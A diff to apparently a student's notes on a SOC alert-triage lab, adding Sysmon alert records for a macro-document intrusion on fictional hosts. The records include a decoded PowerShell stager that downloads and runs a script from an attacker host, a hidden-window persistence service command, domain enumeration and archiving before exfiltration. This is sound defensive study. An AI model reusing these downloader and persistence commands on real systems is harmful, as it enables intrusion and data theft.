@@ -43,9 +43,8 @@ We are tasked with 9 alerts (3 critical and 6 high severity). We receive 4 high 
 
 ![](../../assets/Pasted%20image%2020261022192315.png)
 ![](../../assets/Pasted%20image%2020261022192322.png)
-> 
-> **Alert & Event Metadata**
-> * **Host:** `THM-MSMITH.tryhatmestudios.thm`
+>  **Alert & Event Metadata** 
+> * Host: `THM-MSMITH.tryhatmestudios.thm`
 > * **Timestamp:** `10/23/2026 11:31:04.782`
 > * **Data Source:** `WinEventLog:Microsoft-Windows-Sysmon/Operational`
 > * **Event ID:** `1` (Process Create)
@@ -83,7 +82,8 @@ We are tasked with 9 alerts (3 critical and 6 high severity). We receive 4 high 
 > **Detection Context**
 > * **Description:** Process queried the local Windows Credential Store (`Windows Credentials`). Stored credentials are routinely targeted after initial code execution to enable lateral movement across domain systems without further exploit execution.
 
-
+<Success>True Positive </Success>
+<Info>Escalation Needed </Info>
 
 
 
@@ -94,8 +94,41 @@ We are tasked with 9 alerts (3 critical and 6 high severity). We receive 4 high 
 
 
 
+
+
+
+
+
 ![](../../assets/Pasted%20image%2020261022192358.png)
 ![](../../assets/Pasted%20image%2020261022192407.png)
+> **Alert & Event Metadata**
+> - **Host:** `THM-SREYES[.]tryhatmestudios[.]thm`
+> - **Timestamp:** `10/23/2026 11:46:30.782`
+> - **Data Source:** `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID:** `3` (Network connection detected)
+> - **Record ID:** `43456`
+> - **Target User:** `NT AUTHORITY\SYSTEM`
+> - **User SID:** `S-1-5-18`
+> - **Sid Type:** `0`
+> 
+> **Process Details (Initiating Process)**
+> - **Image Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+> - **Process ID:** `14264`
+> - **Process GUID:** `{3af46175-3bfc-6a90-a41c-000000001100}`
+> 
+> **Network Connection Details**
+> - **Protocol:** `tcp`
+> - **Initiated:** `true`
+> - **Source IP:** `10[.]60[.]10[.]20`
+> - **Source Port:** `52624`
+> - **Destination IP:** `45[.]147[.]230[.]131`
+> - **Destination Port:** `8067`
+> 
+> **Detection Context**
+> - **Description:** This detection fires when a host transmits data to an external destination around the time an archive file is created locally. Connections to the same destination are grouped, so an alert may represent several connections rather than one, and the analyst is expected to establish how many occurred and over what interval. Archive creation followed by an outbound transfer matches the pattern used to move collected data out of an environment, but it also matches routine backup, telemetry, and vendor integration traffic. The analyst must establish what the archive contained, which process opened the connection, and whether the destination is a known and approved service before reaching a verdict.
+
+
+
 
 
 ![](../../assets/Pasted%20image%2020261022192348.png)
@@ -106,33 +139,279 @@ We are tasked with 9 alerts (3 critical and 6 high severity). We receive 4 high 
 
 
 ![](../../assets/Pasted%20image%2020261022194450.png)![](../../assets/Pasted%20image%2020261022194501.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-SREYES.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:43:34.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `3` (Network connection detected)
+> - **Record ID**: `43438`
+> - **Target User**: `NT AUTHORITY\SYSTEM`
+> - **User SID**: `S-1-5-18`
+> - **Sid Type**: `0`
+> 
+> **Process Details (Initiating Process)**
+> - **Image Path**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+> - **Process ID**: `12408`
+> - **Process GUID**: `{3af46175-3c7c-6a90-d11c-000000001100}`
+> 
+> **Network Connection Details**
+> - **Protocol**: `tcp`
+> - **Initiated**: `true`
+> - **Source IP**: `10[.]60[.]10[.]20`
+> - **Source Port**: `56222`
+> - **Destination IP**: `104[.]18[.]32[.]47`
+> - **Destination Port**: `443`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a host transmits data to an external destination around the time an archive file is created locally. Connections to the same destination are grouped, so an alert may represent several connections rather than one, and the analyst is expected to establish how many occurred and over what interval. Archive creation followed by an outbound transfer matches the pattern used to move collected data out of an environment, but it also matches routine backup, telemetry, and vendor integration traffic. The analyst must establish what the archive contained, which process opened the connection, and whether the destination is a known and approved service before reaching a verdict.
+
+
+
+
+
+
 
 
 ![](../../assets/Pasted%20image%2020261022194953.png)
 
 ![](../../assets/Pasted%20image%2020261022195245.png)
 ![](../../assets/Pasted%20image%2020261022195255.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-SREYES.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:38:34.782`
+> - **Data Source**: `WinEventLog:Security`
+> - **Event ID**: `4697` (A service was installed in the system)
+> - **Record ID**: `7589`
+> - **Target User**: `TRYHATME\svc-mktshare`
+> - **User SID**: `S-1-5-21-1966530601-3185510712-10604624-1126`
+> - **Logon ID**: `0x24F6572`
+> 
+> **Service Details (Installed Service)**
+> - **Service Name**: `SvcUpdate`
+> - **Service File Name**: `cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_update.ps1`
+> - **Service Account**: `LocalSystem`
+> - **Service Type**: `0x10`
+> - **Service Start Type**: `3` (Manual)
+> - **Referenced Script Path**: `C:\Windows\Temp\svchost_update.ps1`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a new Windows service is registered on a host and its configured binary path does not resolve to a recognised service executable. Service creation is a durable execution mechanism that runs with high privilege, and software deployment tooling uses it legitimately. The analyst must inspect what the service was configured to run and how that command line was constructed, determine which account created the service and whether the registering session originated over the network or at the console, and establish whether the service started.
+
+
+
+
+
+
+
 
 
 ![](../../assets/Pasted%20image%2020261022195734.png)
 ![](../../assets/Pasted%20image%2020261022195743.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-MSMITH.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:31:00.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `1` (Process Create)
+> - **Record ID**: `46149`
+> - **Target User**: `TRYHATME\m.smith`
+> - **User SID**: `S-1-5-18`
+> - **Logon ID**: `0x9C30E0`
+> - **Logon GUID**: `{3af46175-c39c-6a8f-e030-9c0000000000}`
+> - **Terminal Session ID**: `4`
+> 
+> **Parent Process (Execution Source)**
+> - **Parent Image**: `C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE`
+> - **Parent Process ID**: `6184`
+> - **Parent Process GUID**: `{3af46175-3906-6a90-921d-000000001200}`
+> - **Parent User**: `TRYHATME\m.smith`
+> - **Parent CommandLine**: `"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm" /o ""`
+> - **Referenced File Path**: `C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm`
+> 
+> **Child Process (Target Execution)**
+> - **Image Path**: `C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe`
+> - **Original File Name**: `ai.exe`
+> - **Process ID**: `6304`
+> - **Process GUID**: `{3af46175-3907-6a90-961d-000000001200}`
+> - **CommandLine**: `"C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe" "FEA77156-AD12-420B-A641-3B46EBBA133B" "89226371-A46D-4D73-8A1B-6DA74A52D901" "6184" "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" "WordCombinedFloatieLreOnline.onnx"`
+> - **Current Directory**: `C:\Windows\system32\`
+> - **Integrity Level**: `Medium`
+> - **Product**: `Local AI`
+> - **File Version**: `0.20.18.0`
+> 
+> **Process Hashes (ai.exe)**
+> - **MD5**: `82341DD9F4BF17ED8DB9D2548D0BDB9F`
+> - **SHA256**: `C217D74AABFD0DBBF3BDCDE5F077DABDC62EA8D927AA26E96B9AFA9CB3F1FA80`
+> - **IMPHASH**: `02FA6BD3A9379F6611BD543EB86D66D8`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a user-facing desktop application spawns a child process. Modern office applications legitimately launch helper components, including local machine-learning and assistance features, so a match is not conclusive on its own. Where the child is a script interpreter, particularly one launched with an encoded command or with its window and execution policy suppressed, the activity warrants closer scrutiny. The analyst must inspect the path, publisher, and command line of the spawned binary, recover any concealed instructions, and determine whether code from outside the organisation has run.
+
+
+
 
 ![](../../assets/Pasted%20image%2020261022200257.png)
 ![](../../assets/Pasted%20image%2020261022200306.png)
-
+> **Alert & Event Metadata**
+> - **Host**: `THM-MSMITH.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:31:00.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `1` (Process Create)
+> - **Record ID**: `46148`
+> - **Target User**: `TRYHATME\m.smith`
+> - **User SID**: `S-1-5-18`
+> - **Logon ID**: `0x9C30E0`
+> - **Logon GUID**: `{3af46175-c39c-6a8f-e030-9c0000000000}`
+> - **Terminal Session ID**: `4`
+> 
+> **Parent Process (Execution Source)**
+> - **Parent Image**: `C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE`
+> - **Parent Process ID**: `6184`
+> - **Parent Process GUID**: `{3af46175-3906-6a90-921d-000000001200}`
+> - **Parent User**: `TRYHATME\m.smith`
+> - **Parent CommandLine**: `"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm" /o ""`
+> - **Referenced File Path**: `C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm`
+> 
+> **Child Process (Target Execution)**
+> - **Image Path**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
+> - **Original File Name**: `PowerShell.EXE`
+> - **Process ID**: `8572`
+> - **Process GUID**: `{3af46175-3907-6a90-951d-000000001200}`
+> - **CommandLine**: `powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAIgANAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABpAG4AawAtAGMAZABuAC4AdABoAG0AOgA4ADAANgA3AC8AcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAJwAsACAAJABzAHQAYQBnAGUAcgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAYAAiACQAcwB0AGEAZwBlAHIAYAAiACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==`
+> - **Decoded Command**: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`" -WindowStyle Hidden"`
+> - **Current Directory**: `C:\Windows\system32\`
+> - **Integrity Level**: `Medium`
+> - **Product**: `Microsoft® Windows® Operating System`
+> - **File Version**: `10.0.22621.1635 (WinBuild.160101.0800)`
+> 
+> **Process Hashes (powershell.exe)**
+> - **MD5**: `B94110F627D2BA6C57EB84A0F9575B27`
+> - **SHA256**: `B7327B511CBADC9C471F5AA7438E47FFEC3430145C8D23E0E3256183295CA974`
+> - **IMPHASH**: `C5E22AE5B5F7F22DF3A5C34E34002F28`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a user-facing desktop application spawns a child process. Modern office applications legitimately launch helper components, including local machine-learning and assistance features, so a match is not conclusive on its own. Where the child is a script interpreter, particularly one launched with an encoded command or with its window and execution policy suppressed, the activity warrants closer scrutiny. The analyst must inspect the path, publisher, and command line of the spawned binary, recover any concealed instructions, and determine whether code from outside the organisation has run.
 
 
 
 
 ![](../../assets/Pasted%20image%2020261022201303.png)
 ![](../../assets/Pasted%20image%2020261022201315.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-MSMITH.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:36:04.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `1` (Process Create)
+> - **Record ID**: `46239`
+> - **Target User**: `TRYHATME\m.smith`
+> - **User SID**: `S-1-5-18`
+> - **Logon ID**: `0x9C30E0`
+> - **Logon GUID**: `{3af46175-c39c-6a8f-e030-9c0000000000}`
+> - **Terminal Session ID**: `4`
+> 
+> **Parent Process (Execution Source)**
+> - **Parent Image**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
+> - **Parent Process ID**: `9356`
+> - **Parent Process GUID**: `{3af46175-390a-6a90-991d-000000001200}`
+> - **Parent User**: `TRYHATME\m.smith`
+> - **Parent CommandLine**: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -ExecutionPolicy Bypass -File "C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1"`
+> - **Referenced Script Path**: `C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1`
+> 
+> **Child Process (Target Execution)**
+> - **Image Path**: `C:\Windows\SysWOW64\net.exe`
+> - **Original File Name**: `net.exe`
+> - **Process ID**: `9744`
+> - **Process GUID**: `{3af46175-3a39-6a90-d91d-000000001200}`
+> - **CommandLine**: `"C:\Windows\system32\net.exe" user /domain`
+> - **Current Directory**: `C:\Windows\system32\`
+> - **Integrity Level**: `Medium`
+> - **Product**: `Microsoft® Windows® Operating System`
+> - **File Version**: `10.0.22621.1 (WinBuild.160101.0800)`
+> 
+> **Process Hashes (net.exe)**
+> - **MD5**: `28C604BE558D42A7A999B67219BCE2DB`
+> - **SHA256**: `43C411FC62EEE2A3F04B02C2785DAF37D5B26A36171D037855667D8F32C3D142`
+> - **IMPHASH**: `6C829877160814FC33B041AB46ABAC59`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a workstation that is not used for directory administration runs several domain and host enumeration commands in quick succession. The burst is aggregated, so a single alert represents the sequence rather than one execution, and the analyst is expected to recover the full set of commands issued. Administrators legitimately issue these queries, but rarely as a burst from a standard user endpoint, and the same sequence is a routine early step for a threat actor mapping an environment after gaining execution. The analyst must identify the account and the parent process behind the commands, what information they returned, and what activity followed them.
+
+
+
+
+
 
 ![](../../assets/Pasted%20image%2020261022201455.png)
 ![](../../assets/Pasted%20image%2020261022201504.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-SREYES.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:45:25.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `1` (Process Create)
+> - **Record ID**: `43451`
+> - **Target User**: `NT AUTHORITY\SYSTEM`
+> - **User SID**: `S-1-5-18`
+> - **Logon ID**: `0x3E7`
+> - **Logon GUID**: `{3af46175-ee50-6a8e-e703-000000000000}`
+> - **Terminal Session ID**: `0`
+> 
+> **Parent Process (Execution Source)**
+> - **Parent Image**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+> - **Parent Process ID**: `14264`
+> - **Parent Process GUID**: `{3af46175-3bfc-6a90-a41c-000000001100}`
+> - **Parent User**: `NT AUTHORITY\SYSTEM`
+> - **Parent CommandLine**: `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_update.ps1`
+> - **Referenced Script Path**: `C:\Windows\Temp\svchost_update.ps1`
+> 
+> **Child Process (Target Execution)**
+> - **Image Path**: `C:\Program Files\7-Zip\7z.exe`
+> - **Original File Name**: `7z.exe`
+> - **Process ID**: `9104`
+> - **Process GUID**: `{3af46175-3cec-6a90-e61c-000000001100}`
+> - **CommandLine**: `"C:\Program Files\7-Zip\7z.exe" a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*`
+> - **Current Directory**: `C:\Windows\System32\`
+> - **Integrity Level**: `System`
+> - **Product**: `7-Zip`
+> - **File Version**: `24.09`
+> 
+> **Process Hashes (7z.exe)**
+> - **MD5**: `B6D5860F368B28CAA9DD14A51666A5CD`
+> - **SHA256**: `E2CA3EC168AE9C0B4115CD4FE220145EA9B2DC4B6FC79D765E91F415B34D00DE`
+> - **IMPHASH**: `C9F19638C1640C54CAB9BD55C830AAED`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when an archive utility is executed on a workstation to compress the contents of a directory that the interactive user does not normally package. Bulk compression is how collected data is prepared before it is moved off a host, but backup and diagnostic jobs produce the same telemetry, including under automated non-interactive parents, so parent interactivity alone does not separate them. The analyst must establish what was compressed, where the archive was written, which process launched the utility, and what that same process did on the network afterwards.
 
 
 ![](../../assets/Pasted%20image%2020261023133941.png)
-![](../../assets/Pasted%20image%2020261023133958.png)
+> **Alert & Event Metadata**
+> - **Host**: `THM-MSMITH.tryhatmestudios.thm`
+> - **Timestamp**: `10/23/2026 11:31:03.782`
+> - **Data Source**: `WinEventLog:Microsoft-Windows-Sysmon/Operational`
+> - **Event ID**: `3` (Network connection detected)
+> - **Record ID**: `46159`
+> - **Target User**: `TRYHATME\m.smith`
+> - **User SID**: `S-1-5-18`
+> - **Sid Type**: `0`
+> 
+> **Process Details (Initiating Process)**
+> - **Image Path**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
+> - **Process ID**: `8572`
+> - **Process GUID**: `{3af46175-3907-6a90-951d-000000001200}`
+> 
+> **Network Connection Details**
+> - **Protocol**: `tcp`
+> - **Initiated**: `true`
+> - **Source IP**: `10.60.10.22`
+> - **Source Port**: `54331`
+> - **Destination IP**: `45.147.230.131`
+> - **Destination Port**: `8067`
+> 
+> **Detection Context**
+> - **Description**: This detection fires when a host establishes repeated outbound connections to an external address shortly after a document-handling process chain has run on that host. Connections to the same destination are aggregated, so a single alert represents a pattern rather than one connection, and the analyst is expected to establish how many occurred and over what interval. Code that has only just started executing and immediately reaches infrastructure with no business relationship to the organisation is a common indicator of command-and-control activity, though some line-of-business and update tooling behaves similarly. The analyst must identify the process that opened the connection and characterise the destination infrastructure.
+
+
+
+
 
 
 
